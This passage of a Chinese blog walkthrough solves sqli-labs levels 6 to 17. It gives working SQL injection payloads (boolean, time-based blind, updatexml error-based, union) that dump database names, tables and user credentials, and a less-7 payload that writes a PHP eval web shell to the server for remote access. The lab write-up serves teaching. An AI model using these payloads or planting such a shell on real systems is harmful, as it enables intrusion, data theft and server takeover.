mysqli_fetch_array($result, MYSQLI_BOTH);<br><br><br>    <span class="hljs-keyword">if</span>($row)<br>    &#123;<br>      <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;font size=&quot;5&quot; color=&quot;#FFFF00&quot;&gt;&#x27;</span>;    <br>      <span class="hljs-comment">// 关键语句</span><br>      <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;You are in...........&#x27;</span>;<br>      <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;</span><br><span class="hljs-string">&quot;</span>;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;/font&gt;&quot;</span>;<br>      &#125;<br>    <span class="hljs-keyword">else</span> <br>    &#123;<br>    <br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;font size=&quot;3&quot; color=&quot;#FFFF00&quot;&gt;&#x27;</span>;<br>    print_r(mysqli_error($con1));<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;/br&gt;&lt;/font&gt;&quot;</span>;    <br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;font color= &quot;#0000ff&quot; font size= 3&gt;&#x27;</span>;    <br>    <br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><hr><h2 id="less-6"><a href="#less-6" class="headerlink" title="less-6"></a>less-6</h2><p>闭合方式:<code>id=&quot;$id&quot;</code></p><p>测试闭合方式：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><br>?<span class="hljs-attribute">id</span>=1<br><span class="hljs-comment"># s You are in...........</span><br><br>?<span class="hljs-attribute">id</span>=1 --+<br><span class="hljs-comment"># 正常显示</span><br><br>?<span class="hljs-attribute">id</span>=1&quot; --+<br><span class="hljs-comment"># 正常显示（）</span><br><br>?<span class="hljs-attribute">id</span>=1&quot; <span class="hljs-keyword">and</span> <span class="hljs-attribute">1</span>=1 --+<br><span class="hljs-comment"># 正常显示</span><br><br>?<span class="hljs-attribute">id</span>=1&quot; <span class="hljs-keyword">and</span> <span class="hljs-attribute">1</span>=0 --+<br><span class="hljs-comment"># 不显示</span><br><br></code></pre></td></tr></table></figure><p>将 and 后的式子替换为 less-5 中的报错注入、布尔注入和时间注入即可。</p><hr><h2 id="less-7"><a href="#less-7" class="headerlink" title="less-7"></a>less-7</h2><p>闭合方式：<code>id=((&#39;$id&#39;))</code></p><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><br><span class="xml">?id=1&#x27;)) --+</span><br><span class="xml"># 闭合SQL语句</span><br><br><span class="xml">?id=1&#x27;)) union select 1, 2, &#x27;</span><span class="php"><span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>($_POST[<span class="hljs-string">&quot;pwd&quot;</span>]) <span class="hljs-meta">?&gt;</span></span><span class="xml">&#x27; into outfile &#x27;/Users/littlechieh6/Documents/project/sqli-labs-php7/shell.php&#x27;--+</span><br><span class="xml"># 会将查询结果保存到服务器端的目录下。可以考虑写入服务器后台</span><br><br></code></pre></td></tr></table></figure><p>最后使用蚁剑进行连接即可 getshell。<br><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/8F46C7D8-A92A-4165-BBD9-4C81A65E76F7.png"></p><hr><h2 id="less-8"><a href="#less-8" class="headerlink" title="less-8"></a>less-8</h2><p>闭合方式：<code>id=&#39;$id&#39;</code><br>和前面几题不同点在于：不输出报错信息。</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><br>?<span class="hljs-attribute">id</span>=1<br><span class="hljs-comment"># You are in...........</span><br><br>?<span class="hljs-attribute">id</span>=1&#x27; --+<br><span class="hljs-comment"># 正常显示</span><br><br>?<span class="hljs-attribute">id</span>=1&#x27; <span class="hljs-keyword">and</span> <span class="hljs-attribute">1</span>=1--+<br><span class="hljs-comment"># 正常显示</span><br><br>?<span class="hljs-attribute">id</span>=1&#x27; <span class="hljs-keyword">and</span> <span class="hljs-attribute">1</span>=0--+<br><span class="hljs-comment"># 不显示</span><br><br><span class="hljs-comment"># 考虑参考less-5中的布尔注入进行测试</span><br>?<span class="hljs-attribute">id</span>=1&#x27; <span class="hljs-keyword">and</span> substr(database(), 1, 1)=<span class="hljs-string">&quot;a&quot;</span>  --+<br><span class="hljs-comment"># 不显示</span><br><br>?<span class="hljs-attribute">id</span>=1&#x27; <span class="hljs-keyword">and</span> substr(database(), 1, 1)=<span class="hljs-string">&quot;s&quot;</span>  --+<br><span class="hljs-comment"># 正常显示，修改函数的内容，即可得到后面的内容</span><br><br></code></pre></td></tr></table></figure><hr><h2 id="less-9"><a href="#less-9" class="headerlink" title="less-9"></a>less-9</h2><p>闭合方式：<code>id=&#39;$id&#39;</code></p><p>无论怎么输入都是返回 You are in……。考虑使用时间盲注</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs applescript"><br>?<span class="hljs-built_in">id</span>=<span class="hljs-number">1</span>&#x27; <span class="hljs-keyword">and</span> sleep(<span class="hljs-number">3</span>) <span class="hljs-comment">--+</span><br><span class="hljs-comment"># 使用--+或者%23，如果使用#浏览器可能不进行url编码</span><br><br></code></pre></td></tr></table></figure><p>此处id=1，并且发现有延时。</p><p>这里依然考虑使用 if 语句来进行时间盲注（if 语句挺像C语言的三目运算符的）。类似前面的方法，使用 if+sleep 来先获取数据库名字的长度</p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs lsl"><br># <span class="hljs-number">1.</span> 二分<br>?id=<span class="hljs-number">1</span>&#x27; and if(length(database())&gt;<span class="hljs-number">0</span>, sleep(<span class="hljs-number">3</span>), <span class="hljs-number">1</span>) --+ # 延时，正常执行<br>?id=<span class="hljs-number">1</span>&#x27; and if(length(database())=<span class="hljs-number">0</span>, sleep(<span class="hljs-number">3</span>), <span class="hljs-number">1</span>) --+ # 不延时<br># 用来测试if语句是否正常执行<br><br>?id=<span class="hljs-number">1</span>&#x27; and if(length(database())&gt;<span class="hljs-number">10</span>, sleep(<span class="hljs-number">3</span>), <span class="hljs-number">1</span>) --+ # 不延时<br>?id=<span class="hljs-number">1</span>&#x27; and if(length(database())&gt;<span class="hljs-number">5</span>, sleep(<span class="hljs-number">3</span>), <span class="hljs-number">1</span>) --+  # 延时，代表在 <span class="hljs-number">5</span>, <span class="hljs-number">10</span> 之间<br>?id=<span class="hljs-number">1</span>&#x27; and if(length(database())&gt;<span class="hljs-number">8</span>, sleep(<span class="hljs-number">3</span>), <span class="hljs-number">1</span>) --+  # 不延时，在 [<span class="hljs-number">8</span>, <span class="hljs-number">5</span>)<br>?id=<span class="hljs-number">1</span>&#x27; and if(length(database())=<span class="hljs-number">8</span>, sleep(<span class="hljs-number">3</span>), <span class="hljs-number">1</span>) --+  # 延时，长度为<span class="hljs-number">8</span><br><br>#<span class="hljs-number">2.</span> 逐个测试<br>?id=<span class="hljs-number">1</span>&#x27; and if(length(database())=<span class="hljs-number">1</span>, sleep(<span class="hljs-number">3</span>), <span class="hljs-number">1</span>) --+  <br>?id=<span class="hljs-number">1</span>&#x27; and if(length(database())=<span class="hljs-number">2</span>, sleep(<span class="hljs-number">3</span>), <span class="hljs-number">1</span>) --+  <br><br></code></pre></td></tr></table></figure><p>LEFT(str,len) 返回最左边的 len 个字符的字符串，或者 NULL。</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><br>mysql&gt; select left(<span class="hljs-emphasis">&#x27;foobarbar&#x27;</span>, 5);<br><span class="hljs-code">+----------------------+</span><br>| left(<span class="hljs-emphasis">&#x27;foobarbar&#x27;</span>, 5) |<br><span class="hljs-code">+----------------------+</span><br>| fooba                |<br><span class="hljs-code">+----------------------+</span><br>1 row in set (0.00 sec)<br><br></code></pre></td></tr></table></figure><p>使用 left 来爆破数据库的名字</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><br>?id=<span class="hljs-number">1</span><span class="hljs-string">&#x27; and if(left(database(), 1)=&#x27;</span>a<span class="hljs-string">&#x27;, sleep(3), 1) --+</span><br><span class="hljs-string">?id=1&#x27;</span> <span class="hljs-keyword">and</span> <span class="hljs-keyword">if</span>(left(<span class="hljs-keyword">database</span>(), <span class="hljs-number">1</span>)=<span class="hljs-string">&#x27;b&#x27;</span>, sleep(<span class="hljs-number">3</span>), <span class="hljs-number">1</span>) <span class="hljs-comment">--+</span><br>……<br>……<br>?id=<span class="hljs-number">1</span><span class="hljs-string">&#x27; and if(left(database(), 1)=&#x27;</span>s<span class="hljs-string">&#x27;, sleep(3), 1) --+ # 明显延时</span><br><span class="hljs-string">?id=1&#x27;</span> <span class="hljs-keyword">and</span> <span class="hljs-keyword">if</span>(left(<span class="hljs-keyword">database</span>(), <span class="hljs-number">2</span>)=<span class="hljs-string">&#x27;sa&#x27;</span>, sleep(<span class="hljs-number">3</span>), <span class="hljs-number">1</span>) <span class="hljs-comment">--+ </span><br>……<br>……<br>?id=<span class="hljs-number">1</span><span class="hljs-string">&#x27; and if(left(database(), 2)=&#x27;</span>s<span class="hljs-string">e&#x27;, sleep(3), 1) --+ </span><br><span class="hljs-string"></span><br><span class="hljs-string"># 类似上面的方法，慢慢的增加长度，修改需要对比的字符串，可以得到完整的数据库名</span><br><span class="hljs-string">?id=1&#x27;</span> <span class="hljs-keyword">and</span> <span class="hljs-keyword">if</span>(left(<span class="hljs-keyword">database</span>(), <span class="hljs-number">8</span>)=<span class="hljs-string">&#x27;security&#x27;</span>, sleep(<span class="hljs-number">3</span>), <span class="hljs-number">1</span>) <span class="hljs-comment">--+ # 明显延时</span><br><br></code></pre></td></tr></table></figure><ul><li><p>爆表名的 Payload</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql"><br>?id=1&#x27; and if(left((<span class="hljs-keyword">select</span> table_name <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema=<span class="hljs-keyword">database</span>() <span class="hljs-keyword">limit</span> <span class="hljs-number">1</span>,<span class="hljs-number">1</span>),<span class="hljs-number">1</span>)=<span class="hljs-string">&#x27;r&#x27;</span> , <span class="hljs-keyword">sleep</span>(<span class="hljs-number">3</span>), <span class="hljs-number">1</span>) <span class="hljs-comment">--+</span><br><br></code></pre></td></tr></table></figure><p>需要注意：limit N,M : 相当于 limit M offset N , 从第 N 条记录开始（从0开始）, 返回 M 条记录。这里使用的limit x,1 查询第x个表名。</p></li><li><p>爆字段名的 Payload</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><br>?id=<span class="hljs-number">1</span><span class="hljs-string">&#x27; and if(left((select column_name from information_schema.columns where table_name=&#x27;</span>users<span class="hljs-string">&#x27; limit 4,1),8)=&#x27;</span><span class="hljs-keyword">password</span><span class="hljs-string">&#x27;, sleep(3), 1) --+</span><br><span class="hljs-string">?id=1&#x27;</span> <span class="hljs-keyword">and</span> <span class="hljs-keyword">if</span>(left((<span class="hljs-keyword">select</span> <span class="hljs-built_in">column_name</span> <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">columns</span> <span class="hljs-keyword">where</span> <span class="hljs-built_in">table_name</span>=<span class="hljs-string">&#x27;users&#x27;</span> <span class="hljs-keyword">limit</span> <span class="hljs-number">9</span>,<span class="hljs-number">1</span>),<span class="hljs-number">8</span>)=<span class="hljs-string">&#x27;username&#x27;</span>, sleep(<span class="hljs-number">3</span>), <span class="hljs-number">1</span>) <span class="hljs-comment">--+</span><br><br></code></pre></td></tr></table></figure></li><li><p>爆数据的payload</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><br>?<span class="hljs-attribute">id</span>=1&#x27; <span class="hljs-keyword">and</span> <span class="hljs-keyword">if</span>(left((select password <span class="hljs-keyword">from</span><span class="hljs-built_in"> users </span>order by id limit 0,1),4)=<span class="hljs-string">&#x27;dumb&#x27;</span> , sleep(3), 1) --+<br>?<span class="hljs-attribute">id</span>=1&#x27; <span class="hljs-keyword">and</span> <span class="hljs-keyword">if</span>(left((select username <span class="hljs-keyword">from</span><span class="hljs-built_in"> users </span>order by id limit 0,1),4)=<span class="hljs-string">&#x27;dumb&#x27;</span> , sleep(3), 1) --+<br><br></code></pre></td></tr></table></figure></li></ul><hr><h2 id="less-10"><a href="#less-10" class="headerlink" title="less-10"></a>less-10</h2><p>闭合方式：<code>id=&quot;$id&quot;</code></p><p>将单引号改为双引号即可，其他相同。</p><hr><h2 id="Hackbar"><a href="#Hackbar" class="headerlink" title="Hackbar"></a>Hackbar</h2><p>11 到 21 关都是 POST 型，使用 Hackbar 可以方便的发送 POST 数据</p><ul><li>Chrome 有免费的 Hackbar</li><li>firefox 的 Hackbar 可以考虑用这个项目：<a href="https://github.com/ox01024/hackbar_crack">https://github.com/ox01024/hackbar_crack</a></li></ul><p>基本操作：<br><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/B152DCD1-244C-418E-B784-37A5A28A0280.png"><br>enctype 属性：规定在发送到服务器之前应该如何对表单数据进行编码。<br><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/20210114174430.png"></p><hr><h2 id="less-11"><a href="#less-11" class="headerlink" title="less-11"></a>less-11</h2><p>闭合方式：<code>username=&#39;$uname&#39;</code></p><p>当我尝试使用 Hackbar 提交表单，Hackbar 给出 form.submit is not a function 的错误信息。<br><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/C3EB6EAC-10A7-43B1-8C43-7E168C81A664.png"><br>解决方法：将表单中的 &amp;submit=Submit 删掉。</p><p>后面按照回显方式的由易到难进行测试，这题能正常回显用户名和密码，说明可以正常使用联合注入进行回显。</p><ul><li><p>联合注入 Payload。</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs ada"><br>passwd=D&amp;uname=Dum&#x27; union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>, <span class="hljs-number">2</span> <span class="hljs-comment">--+</span><br><br></code></pre></td></tr></table></figure></li><li><p>报错注入Payload</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs apache"><br><span class="hljs-attribute">passwd</span>=D&amp;uname=Dumb&#x27; and updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0</span>x<span class="hljs-number">7</span>e,(select @@version),<span class="hljs-number">0</span>x<span class="hljs-number">7</span>e),<span class="hljs-number">1</span>)--+<br><span class="hljs-comment"># 数据库版本</span><br><br><span class="hljs-attribute">passwd</span>=D&amp;uname=Dumb&#x27; and updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0</span>x<span class="hljs-number">7</span>e,(select database()),<span class="hljs-number">0</span>x<span class="hljs-number">7</span>e),<span class="hljs-number">1</span>)--+<br><span class="hljs-comment"># 数据库名</span><br><br><span class="hljs-attribute">passwd</span>=D&amp;uname=Dumb&#x27; and updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0</span>x<span class="hljs-number">7</span>e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),<span class="hljs-number">0</span>x<span class="hljs-number">7</span>e),<span class="hljs-number">1</span>)--+<br><span class="hljs-comment"># 表名</span><br><br><span class="hljs-attribute">passwd</span>=D&amp;uname=Dumb&#x27; and updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0</span>x<span class="hljs-number">7</span>e,(select group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;),<span class="hljs-number">0</span>x<span class="hljs-number">7</span>e),<span class="hljs-number">1</span>)--+<br><span class="hljs-comment"># 字段名</span><br><br><span class="hljs-attribute">passwd</span>=D&amp;uname=Dumb&#x27; and updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0</span>x<span class="hljs-number">7</span>e,(select group_concat(username,<span class="hljs-number">0</span>x<span class="hljs-number">3</span>a,password) from users),<span class="hljs-number">0</span>x<span class="hljs-number">7</span>e),<span class="hljs-number">1</span>)--+<br><span class="hljs-comment"># 数据</span><br><br></code></pre></td></tr></table></figure><p>得到回显XPATH syntax error: ‘<del>8.0.19</del>‘，即可以进行报错注入，爆破信息同上面的方法。</p></li><li><p>布尔注入</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><br><span class="hljs-attribute">passwd</span>=D&amp;uname=Dumb&#x27; <span class="hljs-keyword">and</span> <span class="hljs-attribute">1</span>=1--+ # 正常登陆<br><span class="hljs-attribute">passwd</span>=D&amp;uname=Dumb&#x27; <span class="hljs-keyword">and</span> <span class="hljs-attribute">1</span>=2--+ # 登陆错误<br><br></code></pre></td></tr></table></figure><p>这里非常类似前面 GET 的基于布尔的字符型注入。延时注入是基于布尔注入的，当界面无法进行回显的时候才会考虑使用延时注入。</p></li></ul><hr><h2 id="less-12"><a href="#less-12" class="headerlink" title="less-12"></a>less-12</h2><p>闭合方式：<code>password=(&#39;$passwd&#39;)</code></p><p>类似上题只使用一个单引号进行闭合，来观察报错信息，根据报错信息来进行注入。</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><br><span class="hljs-attribute">passwd</span>=Dumb&amp;uname=Dumb&#x27;<br><br></code></pre></td></tr></table></figure><p>就能看到如下报错信息<br><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/B22699CD-05DD-41B8-A46E-19C3EB9BE8ED.png"><br>可以从上图看到，在单引号之后有一个单引号和括号，说明这题需要使用括号。</p><p>再次尝试闭合SQL语句</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><br><span class="hljs-attribute">passwd</span>=Dumb&amp;uname=Dumb&#x27;)  --+<br><br></code></pre></td></tr></table></figure><p>正常登陆后，这题并没有显示查询结果，只是显示你是否登陆，所以不能使用联合注入。</p><p>尝试报错注入（报错注入通过报错信息进行回显）。</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><br><span class="hljs-attribute">passwd</span>=Dumb&amp;uname=Dumb&#x27;)  and updatexml(<span class="hljs-number">1</span>, concat(<span class="hljs-number">0</span>x<span class="hljs-number">7</span>e, (select database()), <span class="hljs-number">0</span>x<span class="hljs-number">7</span>e), <span class="hljs-number">1</span>)--+<br><br></code></pre></td></tr></table></figure><p>根据回显结果可以看出：该题能正常回显报错信息，即可以进行报错注入。</p><p>尝试时间盲注。</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><br><span class="hljs-attribute">passwd</span>=Dumb&amp;uname=Dumb&#x27;)  and if(left(database(), <span class="hljs-number">1</span>)=&#x27;s&#x27;, sleep(<span class="hljs-number">3</span>), <span class="hljs-number">1</span>)--+<br><br></code></pre></td></tr></table></figure><p>能发现有明显的等待，即可以进行时间盲注。</p><hr><h2 id="less-14"><a href="#less-14" class="headerlink" title="less-14"></a>less-14</h2><p>闭合方式：<code>password=&quot;$passwd&quot;</code></p><p>类似前面的步骤进行测试。</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><br><span class="hljs-attribute">passwd</span>=Dumb&amp;uname=Dumb&#x27;<br><span class="hljs-attribute">passwd</span>=Dumb&amp;uname=Dumb&quot;<br><br></code></pre></td></tr></table></figure><p>可以通过 报错信息观察到 SQL 语句的局部，通过局部来推测自己的SQL应该如何写。</p><p>报错注入 Payload</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><br><span class="hljs-attribute">passwd</span>=Dumb&amp;uname=Dumb&quot; <span class="hljs-keyword">and</span> updatexml(1, concat(0x7e, database(), 0x7e), 1)--+<br><br></code></pre></td></tr></table></figure><p>时间盲注 Payload</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><br><span class="hljs-attribute">passwd</span>=Dumb&amp;uname=Dumb&quot; <span class="hljs-keyword">and</span> <span class="hljs-keyword">if</span>(length(database())=8, sleep(3), 1)--+<br><br></code></pre></td></tr></table></figure><hr><h2 id="less-15"><a href="#less-15" class="headerlink" title="less-15"></a>less-15</h2><p>闭合方式：<code>password=&#39;$passwd&#39;</code></p><p>尝试使用前面的步骤回显出 SQL 语句</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><br><span class="hljs-attribute">passwd</span>=Dumb&amp;uname=Dumb&#x27;<br><span class="hljs-attribute">passwd</span>=Dumb&amp;uname=Dumb&quot;<br><br></code></pre></td></tr></table></figure><p>没有回显报错信息，而且都登陆失败，猜测可能关闭和报错的输出</p><p>尝试直接注释，如果能SQL注入，那么用户名正确就能登陆系统。</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><br><span class="hljs-attribute">passwd</span>=Dumb&amp;uname=Dumb&#x27;  --+<br><br></code></pre></td></tr></table></figure><p>登陆成功。</p><p>我们可以在后面拼接 and，and 之后的值为 true 就会正常登陆，值为 false 就登陆失败。（我们拼接的 SQL 语句都在 where 后，where 语句的功能就是根据布尔值进行筛选）</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><br><span class="hljs-attribute">passwd</span>=Dumb&amp;uname=Dumb&#x27; <span class="hljs-keyword">and</span> <span class="hljs-attribute">1</span>=1  --+<br><span class="hljs-attribute">passwd</span>=Dumb&amp;uname=Dumb&#x27; <span class="hljs-keyword">and</span> <span class="hljs-attribute">1</span>=2  --+<br><br></code></pre></td></tr></table></figure><hr><h2 id="less-16"><a href="#less-16" class="headerlink" title="less-16"></a>less-16</h2><p>闭合方式：<code>password=(&quot;$passwd&quot;)</code></p><p>方法同上</p><hr><h2 id="less-17"><a href="#less-17" class="headerlink" title="less-17"></a>less-17</h2><p>闭合方式：<code>password = &#39;$passwd&#39;</code></p><p>进行简单测试</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><br><span class="hljs-attribute">passwd</span>=Dumb&amp;uname=Dumb&#x27;<br><span class="hljs-attribute">passwd</span>=Dumb&amp;uname=Dumb&#x27; --+<br><br></code></pre></td></tr></table></figure><p>并没有结果返回</p><p>查看源码后发现，在执行SQL语句之前对输入的用户名做了检查。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs php"><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">check_input</span>(<span class="hljs-params">$value</span>)</span><br><span class="hljs-function">    </span>&#123;<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-keyword">empty</span>($value))<br>        &#123;<br>        <span class="hljs-comment">// truncation (see comments)</span><br>        $value = substr($value,<span class="hljs-number">0</span>,<span class="hljs-number">15</span>);<br>        &#125;<br> <br>        <span class="hljs-comment">// Stripslashes if magic quotes enabled</span><br>        <span class="hljs-keyword">if</span> (get_magic_quotes_gpc())<br>            &#123;<br>            $value = stripslashes($value);<br>            &#125;<br> <br>        <span class="hljs-comment">// Quote if not a number</span><br>        <span class="hljs-keyword">if</span> (!ctype_digit($value))<br>            &#123;<br>            $value = <span class="hljs-string">&quot;&#x27;&quot;</span> . mysql_real_escape_string($value) . <span class="hljs-string">&quot;&#x27;&quot;</span>;<br>            &#125;<br>        <br>    <span class="hljs-keyword">else</span><br>        &#123;<br>        $value = intval($value);<br>        &#125;<br>    <span class="hljs-keyword">return</span> $value;<br>    &#125;<br>    <br></code></pre></td></tr></table></figure><ul><li>magic_quotes_gpc 函数在 php 中的作用是判断解析用户提示的数据，如包括有：post、get、cookie过来的数据增加转义字符“\”，以确保这些数据不会引起程序，特别是数据库语句因为特殊字符引起的污染而出现致命的错误。在 magic_quotes_gpc = On 的情况下，如果输入的数据有：<ol><li>单引号（’）</li><li>双引号（”）</li><li>反斜线（\）</li><li>NULL（NULL 字符）<br>（字符都会被加上反斜线）</li></ol></li><li>stripslashes() 删除由 addslashes() 函数添加的反斜杠</li><li>ctype_digit() 判断是不是数字，是数字就返回 true，否则返回 false</li><li>mysql_real_escape_string() 转义 SQL 语句中使用的字符串中的特殊字符。</li><li>intval()   整型转换</li></ul><p>但是没有对密码进行限制，password被直接拼接到SQL语句中。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><br><span class="hljs-variable">$update</span>=<span class="hljs-string">&quot;UPDATE users SET password = &#x27;<span class="hljs-variable">$passwd</span>&#x27; WHERE username=&#x27;<span class="hljs-variable">$row1</span>&#x27;&quot;</span>;<br><br></code></pre></td></tr></table></figure><p>然后发现使用 <code>passwd=Dumb&#39; and 1=1 --+&amp;uname=Dumb</code> 会发生报错并将报错信息进行显示。发送下面的数据，就可以进行报错注入。</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><br><span class="hljs-attribute">passwd</span>=Dumb&#x27; and updatexml(<span class="hljs-number">1</span>, concat(<span class="hljs-number">0</span>x<span class="hljs-number">7</span>e, user(), <span class="hljs-number">0</span>x<span class="hljs-number">7</span>e), <span class="hljs-number">1</span>) 